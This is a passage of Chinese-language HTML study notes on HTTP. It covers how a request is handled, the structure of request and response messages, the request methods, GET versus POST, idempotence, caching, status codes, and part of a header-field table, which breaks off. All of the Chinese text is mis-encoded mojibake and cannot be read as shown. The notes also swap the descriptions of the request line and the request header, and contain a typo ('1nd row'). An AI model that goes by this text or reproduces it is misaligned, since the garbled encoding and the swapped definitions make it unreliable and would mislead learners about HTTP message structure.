<li>ä¸€ä¸ªHTTPå®¢æˆ·ç«¯ï¼Œé€šå¸¸æ˜¯æµè§ˆå™¨ï¼Œä¸WebæœåŠ¡å™¨çš„HTTPç«¯å£ï¼ˆé»˜è®¤ä¸º80ï¼‰å»ºç«‹ä¸€ä¸ªTCPå¥—æ¥å­—è¿æ¥ã€‚ä¾‹å¦‚ï¼Œhttp://www.oakcms.cnã€‚</li>
</ul>
</li>
<li>å‘é€HTTPè¯·æ±‚
<ul>
<li>é€šè¿‡TCPå¥—æ¥å­—ï¼Œå®¢æˆ·ç«¯å‘WebæœåŠ¡å™¨å‘é€ä¸€ä¸ªæ–‡æœ¬çš„è¯·æ±‚æŠ¥æ–‡ï¼Œä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡ç”±è¯·æ±‚è¡Œã€è¯·æ±‚å¤´éƒ¨ã€ç©ºè¡Œå’Œè¯·æ±‚æ•°æ®4éƒ¨åˆ†ç»„æˆã€‚</li>
</ul>
</li>
<li>æœåŠ¡å™¨æ¥å—è¯·æ±‚å¹¶è¿”å›HTTPå“åº”
<ul>
<li>WebæœåŠ¡å™¨è§£æè¯·æ±‚ï¼Œå®šä½è¯·æ±‚èµ„æºã€‚æœåŠ¡å™¨å°†èµ„æºå¤æœ¬å†™åˆ°TCPå¥—æ¥å­—ï¼Œç”±å®¢æˆ·ç«¯è¯»å–ã€‚ä¸€ä¸ªå“åº”ç”±çŠ¶æ€è¡Œã€å“åº”å¤´éƒ¨ã€ç©ºè¡Œå’Œå“åº”æ•°æ®4éƒ¨åˆ†ç»„æˆã€‚</li>
</ul>
</li>
<li>é‡Šæ”¾è¿æ¥TCPè¿æ¥
<ul>
<li>è‹¥connection æ¨¡å¼ä¸ºcloseï¼Œåˆ™æœåŠ¡å™¨ä¸»åŠ¨å…³é—­TCPè¿æ¥ï¼Œå®¢æˆ·ç«¯è¢«åŠ¨å…³é—­è¿æ¥ï¼Œé‡Šæ”¾TCPè¿æ¥;è‹¥connection æ¨¡å¼ä¸ºkeepaliveï¼Œåˆ™è¯¥è¿æ¥ä¼šä¿æŒä¸€æ®µæ—¶é—´ï¼Œåœ¨è¯¥æ—¶é—´å†…å¯ä»¥ç»§ç»­æ¥æ”¶è¯·æ±‚</li>
</ul>
</li>
<li>å®¢æˆ·ç«¯æµè§ˆå™¨è§£æHTMLå†…å®¹
<ul>
<li>å®¢æˆ·ç«¯æµè§ˆå™¨é¦–å…ˆè§£æçŠ¶æ€è¡Œï¼ŒæŸ¥çœ‹è¡¨æ˜è¯·æ±‚æ˜¯å¦æˆåŠŸçš„çŠ¶æ€ä»£ç ã€‚ç„¶åè§£ææ¯ä¸€ä¸ªå“åº”å¤´ï¼Œå“åº”å¤´å‘ŠçŸ¥ä»¥ä¸‹ä¸ºè‹¥å¹²å­—èŠ‚çš„HTMLæ–‡æ¡£å’Œæ–‡æ¡£çš„å­—ç¬¦é›†ã€‚å®¢æˆ·ç«¯æµè§ˆå™¨è¯»å–å“åº”æ•°æ®HTMLï¼Œæ ¹æ®HTMLçš„è¯­æ³•å¯¹å…¶è¿›è¡Œæ ¼å¼åŒ–ï¼Œå¹¶åœ¨æµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºã€‚</li>
</ul>
</li>
</ol>
<h2 id="è¯·æ±‚å’Œå“åº”æŠ¥æ–‡" tabindex="-1"> è¯·æ±‚å’Œå“åº”æŠ¥æ–‡</h2>
<h3 id="_1-è¯·æ±‚æŠ¥æ–‡" tabindex="-1"> 1. è¯·æ±‚æŠ¥æ–‡</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/HTTP_RequestMessageExample.png" width=""/> </div><br>
<p>è¯·æ±‚æ ¼å¼ç»“æ„</p>
<ul>
<li>è¯·æ±‚è¡Œï¼šæ¶ˆæ¯æŠ¥å¤´ï¼Œä¸€èˆ¬ç”¨æ¥è¯´æ˜å®¢æˆ·ç«¯è¦ä½¿ç”¨çš„ä¸€äº›é™„åŠ ä¿¡æ¯</li>
<li>è¯·æ±‚å¤´ï¼šè¯·æ±‚æ–¹å¼ã€è¯·æ±‚çš„åœ°å€å’ŒHTTPåè®®ç‰ˆæœ¬</li>
<li>ç©ºè¡Œï¼š ä½äºè¯·æ±‚å¤´å’Œè¯·æ±‚æ•°æ®ä¹‹é—´ï¼Œç©ºè¡Œæ˜¯å¿…é¡»çš„ã€‚</li>
<li>è¯·æ±‚æ•°æ®ï¼šéå¿…é¡»ã€‚</li>
</ul>
<h3 id="_2-å“åº”æŠ¥æ–‡" tabindex="-1"> 2. å“åº”æŠ¥æ–‡</h3>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/HTTP_ResponseMessageExample.png" width=""/> </div><br>
<p>å“åº”æ ¼å¼çš„ç»“æ„ï¼š</p>
<ul>
<li>å“åº”è¡Œ(çŠ¶æ€è¡Œ)ï¼šHTTPç‰ˆæœ¬ã€çŠ¶æ€ç ã€çŠ¶æ€æ¶ˆæ¯</li>
<li>å“åº”å¤´ï¼šæ¶ˆæ¯æŠ¥å¤´ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨çš„é™„åŠ ä¿¡æ¯</li>
<li>ç©ºè¡Œï¼šå“åº”å¤´å’Œå“åº”å®ä½“ä¹‹é—´çš„ï¼Œå¿…é¡»çš„ã€‚</li>
<li>å“åº”å®ä½“ï¼šæ­£æ–‡ï¼ŒæœåŠ¡å™¨è¿”å›ç»™æµè§ˆå™¨çš„ä¿¡æ¯</li>
</ul>
<h2 id="http-è¯·æ±‚æ–¹æ³•" tabindex="-1"> HTTP è¯·æ±‚æ–¹æ³•</h2>
<p>å®¢æˆ·ç«¯å‘é€çš„  <strong>è¯·æ±‚æŠ¥æ–‡</strong>  ç¬¬ä¸€è¡Œä¸ºè¯·æ±‚è¡Œï¼ŒåŒ…å«äº†æ–¹æ³•å­—æ®µã€‚</p>
<p>HTTP1.0å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼šGET, POST å’Œ HEADæ–¹æ³•ã€‚
HTTP1.1æ–°å¢äº†äº”ç§è¯·æ±‚æ–¹æ³•ï¼šOPTIONS, PUT, DELETE, TRACE å’Œ CONNECT æ–¹æ³•ã€‚</p>
<table>
<thead>
<tr>
<th>è¯·æ±‚æ–¹æ³•</th>
<th>ç”¨é€”</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>è·å–èµ„æº</td>
<td>è¯·æ±‚æŒ‡å®šçš„é¡µé¢ä¿¡æ¯ï¼Œå¹¶è¿”å›å®ä½“ä¸»ä½“ã€‚</td>
</tr>
<tr>
<td>HEAD</td>
<td>è·å–æŠ¥æ–‡é¦–éƒ¨</td>
<td>å’Œ GET æ–¹æ³•ç±»ä¼¼ï¼Œä½†æ˜¯ä¸è¿”å›æŠ¥æ–‡å®ä½“ä¸»ä½“éƒ¨åˆ†ã€‚ä¸»è¦ç”¨äºç¡®è®¤ URL çš„æœ‰æ•ˆæ€§ä»¥åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚</td>
</tr>
<tr>
<td>POST</td>
<td>ä¼ è¾“å®ä½“ä¸»ä½“</td>
<td>å‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POSTè¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„å»ºç«‹å’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚</td>
</tr>
<tr>
<td>PUT</td>
<td>ä¸Šä¼ æ–‡ä»¶</td>
<td>ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€çš„æ•°æ®å–ä»£æŒ‡å®šçš„æ–‡æ¡£çš„å†…å®¹ã€‚ç”±äºè‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå› æ­¤å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨è¯¥æ–¹æ³•ã€‚</td>
</tr>
<tr>
<td>DELETE</td>
<td>åˆ é™¤æ–‡ä»¶</td>
<td>è¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šçš„é¡µé¢ã€‚ä¸ PUT åŠŸèƒ½ç›¸åï¼Œå¹¶ä¸”åŒæ ·ä¸å¸¦éªŒè¯æœºåˆ¶ã€‚</td>
</tr>
<tr>
<td>CONNECT</td>
<td>è¦æ±‚åœ¨ä¸ä»£ç†æœåŠ¡å™¨é€šä¿¡æ—¶å»ºç«‹éš§é“</td>
<td>HTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚</td>
</tr>
<tr>
<td>OPTIONS</td>
<td>æŸ¥è¯¢æ”¯æŒçš„æ–¹æ³•</td>
<td>å…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½ã€‚æŸ¥è¯¢æŒ‡å®šçš„ URL èƒ½å¤Ÿæ”¯æŒçš„æ–¹æ³•ã€‚ä¼šè¿”å› <code>Allow: GET, POST, HEAD, OPTIONS</code> è¿™æ ·çš„å†…å®¹ã€‚</td>
</tr>
<tr>
<td>TRACE</td>
<td>è¿½è¸ªè·¯å¾„</td>
<td>å›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚</td>
</tr>
<tr>
<td>PATCH</td>
<td>å¯¹èµ„æºè¿›è¡Œéƒ¨åˆ†ä¿®æ”¹</td>
<td>PUT ä¹Ÿå¯ä»¥ç”¨äºä¿®æ”¹èµ„æºï¼Œä½†æ˜¯åªèƒ½å®Œå…¨æ›¿ä»£åŸå§‹èµ„æºï¼ŒPATCH å…è®¸éƒ¨åˆ†ä¿®æ”¹ã€‚</td>
</tr>
</tbody>
</table>
<p><strong>CONNECT</strong></p>
<blockquote>
<p>è¦æ±‚åœ¨ä¸ä»£ç†æœåŠ¡å™¨é€šä¿¡æ—¶å»ºç«‹éš§é“</p>
</blockquote>
<p>ä½¿ç”¨ SSLï¼ˆSecure Sockets Layerï¼Œå®‰å…¨å¥—æ¥å±‚ï¼‰å’Œ TLSï¼ˆTransport Layer Securityï¼Œä¼ è¾“å±‚å®‰å…¨ï¼‰åè®®æŠŠé€šä¿¡å†…å®¹åŠ å¯†åç»ç½‘ç»œéš§é“ä¼ è¾“ã€‚</p>
<div><pre><code>CONNECT www.example.com:443 HTTP/1.1
</code></pre></div><div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dc00f70e-c5c8-4d20-baf1-2d70014a97e3.jpg" width=""/> </div><br>
<p><strong>TRACE</strong></p>
<blockquote>
<p>è¿½è¸ªè·¯å¾„</p>
</blockquote>
<p>æœåŠ¡å™¨ä¼šå°†é€šä¿¡è·¯å¾„è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>
<p>å‘é€è¯·æ±‚æ—¶ï¼Œåœ¨ Max-Forwards é¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼ï¼Œæ¯ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨å°±ä¼šå‡ 1ï¼Œå½“æ•°å€¼ä¸º 0 æ—¶å°±åœæ­¢ä¼ è¾“ã€‚</p>
<p>é€šå¸¸ä¸ä¼šä½¿ç”¨ TRACEï¼Œå¹¶ä¸”å®ƒå®¹æ˜“å—åˆ° XST æ”»å‡»ï¼ˆCross-Site Tracingï¼Œè·¨ç«™è¿½è¸ªï¼‰ã€‚</p>
<h2 id="get-å’Œ-post-æ¯”è¾ƒ" tabindex="-1"> GET å’Œ POST æ¯”è¾ƒ</h2>
<h3 id="ä½œç”¨" tabindex="-1"> ä½œç”¨</h3>
<p>GET ç”¨äºè·å–èµ„æºï¼Œè€Œ POST ç”¨äºä¼ è¾“å®ä½“ä¸»ä½“ã€‚</p>
<h3 id="å‚æ•°" tabindex="-1"> å‚æ•°</h3>
<p>GET å’Œ POST çš„è¯·æ±‚éƒ½èƒ½ä½¿ç”¨é¢å¤–çš„å‚æ•°ï¼Œä½†æ˜¯ GET çš„å‚æ•°æ˜¯ä»¥æŸ¥è¯¢å­—ç¬¦ä¸²å‡ºç°åœ¨ URL ä¸­ï¼Œè€Œ POST çš„å‚æ•°å­˜å‚¨åœ¨å®ä½“ä¸»ä½“ä¸­ã€‚ä¸èƒ½å› ä¸º POST å‚æ•°å­˜å‚¨åœ¨å®ä½“ä¸»ä½“ä¸­å°±è®¤ä¸ºå®ƒçš„å®‰å…¨æ€§æ›´é«˜ï¼Œå› ä¸ºç…§æ ·å¯ä»¥é€šè¿‡ä¸€äº›æŠ“åŒ…å·¥å…·ï¼ˆFiddlerï¼‰æŸ¥çœ‹ã€‚</p>
<p>å› ä¸º URL åªæ”¯æŒ ASCII ç ï¼Œå› æ­¤ GET çš„å‚æ•°ä¸­å¦‚æœå­˜åœ¨ä¸­æ–‡ç­‰å­—ç¬¦å°±éœ€è¦å…ˆè¿›è¡Œç¼–ç ã€‚ä¾‹å¦‚ <code>ä¸­æ–‡</code> ä¼šè½¬æ¢ä¸º <code>%E4%B8%AD%E6%96%87</code>ï¼Œè€Œç©ºæ ¼ä¼šè½¬æ¢ä¸º <code>%20</code>ã€‚POST å‚æ•°æ”¯æŒæ ‡å‡†å­—ç¬¦é›†ã€‚</p>
<div><pre><code>GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1
</code></pre></div><div><pre><code>POST /test/demo_form.asp HTTP/1.1
Host: w3schools.com
name1=value1&amp;name2=value2
</code></pre></div><h3 id="å®‰å…¨" tabindex="-1"> å®‰å…¨</h3>
<p>å®‰å…¨çš„ HTTP æ–¹æ³•ä¸ä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªæ˜¯å¯è¯»çš„ã€‚</p>
<p>GET æ–¹æ³•æ˜¯å®‰å…¨çš„ï¼Œè€Œ POST å´ä¸æ˜¯ï¼Œå› ä¸º POST çš„ç›®çš„æ˜¯ä¼ é€å®ä½“ä¸»ä½“å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹å¯èƒ½æ˜¯ç”¨æˆ·ä¸Šä¼ çš„è¡¨å•æ•°æ®ï¼Œä¸Šä¼ æˆåŠŸä¹‹åï¼ŒæœåŠ¡å™¨å¯èƒ½æŠŠè¿™ä¸ªæ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå› æ­¤çŠ¶æ€ä¹Ÿå°±å‘ç”Ÿäº†æ”¹å˜ã€‚</p>
<p>å®‰å…¨çš„æ–¹æ³•é™¤äº† GET ä¹‹å¤–è¿˜æœ‰ï¼šHEADã€OPTIONSã€‚</p>
<p>ä¸å®‰å…¨çš„æ–¹æ³•é™¤äº† POST ä¹‹å¤–è¿˜æœ‰ PUTã€DELETEã€‚</p>
<h3 id="å¹‚ç­‰æ€§" tabindex="-1"> å¹‚ç­‰æ€§</h3>
<p>å¹‚ç­‰çš„ HTTP æ–¹æ³•ï¼ŒåŒæ ·çš„è¯·æ±‚è¢«æ‰§è¡Œä¸€æ¬¡ä¸è¿ç»­æ‰§è¡Œå¤šæ¬¡çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼ŒæœåŠ¡å™¨çš„çŠ¶æ€ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ¢å¥è¯è¯´å°±æ˜¯ï¼Œå¹‚ç­‰æ–¹æ³•ä¸åº”è¯¥å…·æœ‰å‰¯ä½œç”¨ï¼ˆç»Ÿè®¡ç”¨é€”é™¤å¤–ï¼‰ã€‚</p>
<p>æ‰€æœ‰çš„å®‰å…¨æ–¹æ³•ä¹Ÿéƒ½æ˜¯å¹‚ç­‰çš„ã€‚</p>
<p>åœ¨æ­£ç¡®å®ç°çš„æ¡ä»¶ä¸‹ï¼ŒGETï¼ŒHEADï¼ŒPUT å’Œ DELETE ç­‰æ–¹æ³•éƒ½æ˜¯å¹‚ç­‰çš„ï¼Œè€Œ POST æ–¹æ³•ä¸æ˜¯ã€‚</p>
<p>GET /pageX HTTP/1.1 æ˜¯å¹‚ç­‰çš„ï¼Œè¿ç»­è°ƒç”¨å¤šæ¬¡ï¼Œå®¢æˆ·ç«¯æ¥æ”¶åˆ°çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼š</p>
<div><pre><code>GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
</code></pre></div><p>POST /add_row HTTP/1.1 ä¸æ˜¯å¹‚ç­‰çš„ï¼Œå¦‚æœè°ƒç”¨å¤šæ¬¡ï¼Œå°±ä¼šå¢åŠ å¤šè¡Œè®°å½•ï¼š</p>
<div><pre><code>POST /add_row HTTP/1.1   -> Adds a 1nd row
POST /add_row HTTP/1.1   -> Adds a 2nd row
POST /add_row HTTP/1.1   -> Adds a 3rd row
</code></pre></div><p>DELETE /idX/delete HTTP/1.1 æ˜¯å¹‚ç­‰çš„ï¼Œå³ä½¿ä¸åŒçš„è¯·æ±‚æ¥æ”¶åˆ°çš„çŠ¶æ€ç ä¸ä¸€æ ·ï¼š</p>
<div><pre><code>DELETE /idX/delete HTTP/1.1   -> Returns 200 if idX exists
DELETE /idX/delete HTTP/1.1   -> Returns 404 as it just got deleted
DELETE /idX/delete HTTP/1.1   -> Returns 404
</code></pre></div><h3 id="å¯ç¼“å­˜" tabindex="-1"> å¯ç¼“å­˜</h3>
<p>å¦‚æœè¦å¯¹å“åº”è¿›è¡Œç¼“å­˜ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>è¯·æ±‚æŠ¥æ–‡çš„ HTTP æ–¹æ³•æœ¬èº«æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ GET å’Œ HEADï¼Œä½†æ˜¯ PUT å’Œ DELETE ä¸å¯ç¼“å­˜ï¼ŒPOST åœ¨å¤šæ•°æƒ…å†µä¸‹ä¸å¯ç¼“å­˜çš„ã€‚</li>
<li>å“åº”æŠ¥æ–‡çš„çŠ¶æ€ç æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ï¼š200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501ã€‚</li>
<li>å“åº”æŠ¥æ–‡çš„ Cache-Control é¦–éƒ¨å­—æ®µæ²¡æœ‰æŒ‡å®šä¸è¿›è¡Œç¼“å­˜ã€‚</li>
</ul>
<h3 id="xmlhttprequest" tabindex="-1"> XMLHttpRequest</h3>
<p>ä¸ºäº†é˜è¿° POST å’Œ GET çš„å¦ä¸€ä¸ªåŒºåˆ«ï¼Œéœ€è¦å…ˆäº†è§£ XMLHttpRequestï¼š</p>
<blockquote>
<p>XMLHttpRequest æ˜¯ä¸€ä¸ª APIï¼Œå®ƒä¸ºå®¢æˆ·ç«¯æä¾›äº†åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®çš„åŠŸèƒ½ã€‚å®ƒæä¾›äº†ä¸€ä¸ªé€šè¿‡ URL æ¥è·å–æ•°æ®çš„ç®€å•æ–¹å¼ï¼Œå¹¶ä¸”ä¸ä¼šä½¿æ•´ä¸ªé¡µé¢åˆ·æ–°ã€‚è¿™ä½¿å¾—ç½‘é¡µåªæ›´æ–°ä¸€éƒ¨åˆ†é¡µé¢è€Œä¸ä¼šæ‰“æ‰°åˆ°ç”¨æˆ·ã€‚XMLHttpRequest åœ¨ AJAX ä¸­è¢«å¤§é‡ä½¿ç”¨ã€‚</p>
</blockquote>
<ul>
<li>åœ¨ä½¿ç”¨ XMLHttpRequest çš„ POST æ–¹æ³•æ—¶ï¼Œæµè§ˆå™¨ä¼šå…ˆå‘é€ Header å†å‘é€ Dataã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨ä¼šè¿™ä¹ˆåšï¼Œä¾‹å¦‚ç«ç‹å°±ä¸ä¼šã€‚</li>
<li>è€Œ GET æ–¹æ³• Header å’Œ Data ä¼šä¸€èµ·å‘é€ã€‚</li>
</ul>
<h2 id="http-çŠ¶æ€ç " tabindex="-1"> HTTP çŠ¶æ€ç </h2>
<p>æœåŠ¡å™¨è¿”å›çš„  <strong>å“åº”æŠ¥æ–‡</strong>  ä¸­ç¬¬ä¸€è¡Œä¸ºçŠ¶æ€è¡Œï¼ŒåŒ…å«äº†çŠ¶æ€ç ä»¥åŠåŸå› çŸ­è¯­ï¼Œç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯è¯·æ±‚çš„ç»“æœã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">çŠ¶æ€ç </th>
<th style="text-align:center">ç±»åˆ«</th>
<th style="text-align:center">å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1XX</td>
<td style="text-align:center">Informationalï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰</td>
<td style="text-align:center">æ¥æ”¶çš„è¯·æ±‚æ­£åœ¨å¤„ç†</td>
</tr>
<tr>
<td style="text-align:center">2XX</td>
<td style="text-align:center">Successï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰</td>
<td style="text-align:center">è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯•</td>
</tr>
<tr>
<td style="text-align:center">3XX</td>
<td style="text-align:center">Redirectionï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰</td>
<td style="text-align:center">éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚</td>
</tr>
<tr>
<td style="text-align:center">4XX</td>
<td style="text-align:center">Client Errorï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰</td>
<td style="text-align:center">æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚</td>
</tr>
<tr>
<td style="text-align:center">5XX</td>
<td style="text-align:center">Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰</td>
<td style="text-align:center">æœåŠ¡å™¨å¤„ç†è¯·æ±‚å‡ºé”™</td>
</tr>
</tbody>
</table>
<p><strong>1XX ä¿¡æ¯</strong></p>
<ul>
<li><strong>100 Continue</strong> ï¼šè¡¨æ˜åˆ°ç›®å‰ä¸ºæ­¢éƒ½å¾ˆæ­£å¸¸ï¼Œå®¢æˆ·ç«¯å¯ä»¥ç»§ç»­å‘é€è¯·æ±‚æˆ–è€…å¿½ç•¥è¿™ä¸ªå“åº”ã€‚</li>
</ul>
<p><strong>2XX æˆåŠŸ</strong></p>
<ul>
<li><strong>200 OK</strong></li>
<li><strong>204 No Content</strong> ï¼šè¯·æ±‚å·²ç»æˆåŠŸå¤„ç†ï¼Œä½†æ˜¯è¿”å›çš„å“åº”æŠ¥æ–‡ä¸åŒ…å«å®ä½“çš„ä¸»ä½“éƒ¨åˆ†ã€‚ä¸€èˆ¬åœ¨åªéœ€è¦ä»å®¢æˆ·ç«¯å¾€æœåŠ¡å™¨å‘é€ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦è¿”å›æ•°æ®æ—¶ä½¿ç”¨ã€‚</li>
<li><strong>206 Partial Content</strong> ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ï¼Œå“åº”æŠ¥æ–‡åŒ…å«ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®ä½“å†…å®¹ã€‚</li>
</ul>
<p><strong>3XX é‡å®šå‘</strong></p>
<ul>
<li><strong>301 Moved Permanently</strong> ï¼šæ°¸ä¹…æ€§é‡å®šå‘</li>
<li><strong>302 Found</strong> ï¼šä¸´æ—¶æ€§é‡å®šå‘</li>
<li><strong>303 See Other</strong> ï¼šå’Œ 302 æœ‰ç€ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯ 303 æ˜ç¡®è¦æ±‚å®¢æˆ·ç«¯åº”è¯¥é‡‡ç”¨ GET æ–¹æ³•è·å–èµ„æºã€‚</li>
<li>æ³¨ï¼šè™½ç„¶ HTTP åè®®è§„å®š 301ã€302 çŠ¶æ€ä¸‹é‡å®šå‘æ—¶ä¸å…è®¸æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ï¼Œä½†æ˜¯å¤§å¤šæ•°æµè§ˆå™¨éƒ½ä¼šåœ¨ 301ã€302 å’Œ 303 çŠ¶æ€ä¸‹çš„é‡å®šå‘æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚</li>
<li><strong>304 Not Modified</strong> ï¼šå¦‚æœè¯·æ±‚æŠ¥æ–‡é¦–éƒ¨åŒ…å«ä¸€äº›æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šIf-Matchï¼ŒIf-Modified-Sinceï¼ŒIf-None-Matchï¼ŒIf-Rangeï¼ŒIf-Unmodified-Sinceï¼Œå¦‚æœä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™æœåŠ¡å™¨ä¼šè¿”å› 304 çŠ¶æ€ç ã€‚</li>
<li><strong>307 Temporary Redirect</strong> ï¼šä¸´æ—¶é‡å®šå‘ï¼Œä¸ 302 çš„å«ä¹‰ç±»ä¼¼ï¼Œä½†æ˜¯ 307 è¦æ±‚æµè§ˆå™¨ä¸ä¼šæŠŠé‡å®šå‘è¯·æ±‚çš„ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚</li>
</ul>
<p><strong>4XX å®¢æˆ·ç«¯é”™è¯¯</strong></p>
<ul>
<li><strong>400 Bad Request</strong> ï¼šè¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚</li>
<li><strong>401 Unauthorized</strong> ï¼šè¯¥çŠ¶æ€ç è¡¨ç¤ºå‘é€çš„è¯·æ±‚éœ€è¦æœ‰è®¤è¯ä¿¡æ¯ï¼ˆBASIC è®¤è¯ã€DIGEST è®¤è¯ï¼‰ã€‚å¦‚æœä¹‹å‰å·²è¿›è¡Œè¿‡ä¸€æ¬¡è¯·æ±‚ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·è®¤è¯å¤±è´¥ã€‚</li>
<li><strong>403 Forbidden</strong> ï¼šè¯·æ±‚è¢«æ‹’ç»ã€‚</li>
<li><strong>404 Not Found</strong></li>
</ul>
<p><strong>5XX æœåŠ¡å™¨é”™è¯¯</strong></p>
<ul>
<li><strong>500 Internal Server Error</strong> ï¼šæœåŠ¡å™¨æ­£åœ¨æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯ã€‚</li>
<li><strong>503 Service Unavailable</strong> ï¼šæœåŠ¡å™¨æš‚æ—¶å¤„äºè¶…è´Ÿè½½æˆ–æ­£åœ¨è¿›è¡Œåœæœºç»´æŠ¤ï¼Œç°åœ¨æ— æ³•å¤„ç†è¯·æ±‚ã€‚</li>
</ul>
<h1 id="ä¸‰ã€http-é¦–éƒ¨" tabindex="-1"> ä¸‰ã€HTTP é¦–éƒ¨</h1>
<p>æœ‰ 4 ç§ç±»å‹çš„é¦–éƒ¨å­—æ®µï¼šé€šç”¨é¦–éƒ¨å­—æ®µã€è¯·æ±‚é¦–éƒ¨å­—æ®µã€å“åº”é¦–éƒ¨å­—æ®µå’Œå®ä½“é¦–éƒ¨å­—æ®µã€‚</p>
<p>å„ç§é¦–éƒ¨å­—æ®µåŠå…¶å«ä¹‰å¦‚ä¸‹ï¼ˆä¸éœ€è¦å…¨è®°ï¼Œä»…ä¾›æŸ¥é˜…ï¼‰ï¼š</p>
<h2 id="é€šç”¨é¦–éƒ¨å­—æ®µ" tabindex="-1"> é€šç”¨é¦–éƒ¨å­—æ®µ</h2>
<table>
<thead>
<tr>
<th style="text-align:center">é¦–éƒ¨å­—æ®µå</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Cache-Control</td>
<td style="text-align:center">æ§åˆ¶ç¼“å­˜çš„è¡Œä¸º</td>
</tr>
<tr>
<td style="text-align:center">Connection</td>
<td style="text-align:center">æ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µã€ç®¡ç†æŒä¹…è¿æ¥</td>
</tr>
<tr>
<td style="text-align:center">Date</td>
<td style="text-align:center">åˆ›å»ºæŠ¥æ–‡çš„æ—¥æœŸæ—¶é—´</td>
</tr>
<tr>
<td style="text-align:center">Pragma</td>
<td style="text-align:center">æŠ¥æ–‡æŒ‡ä»¤</td>
</tr>
<tr>
<td style="text-align:center">Trailer</td>
<td style="text-align:center">æŠ¥æ–‡æœ«ç«¯çš„é¦–éƒ¨ä¸€è§ˆ</td>
</tr>
<tr>
<td style="text-align:center">Transfer-Encoding</td>
<td style="text-align:center">æŒ‡å®šæŠ¥æ–‡ä¸»ä½“çš„ä¼ è¾“ç¼–ç æ–¹å¼</td>
</tr>
<tr>
<td style="text-align:center">Upgrade</td>
<td style="text-align:center">å‡çº§ä¸ºå…¶ä»–åè®®</td>
</tr>
<tr>
<td style="text-align:center">Via</td>
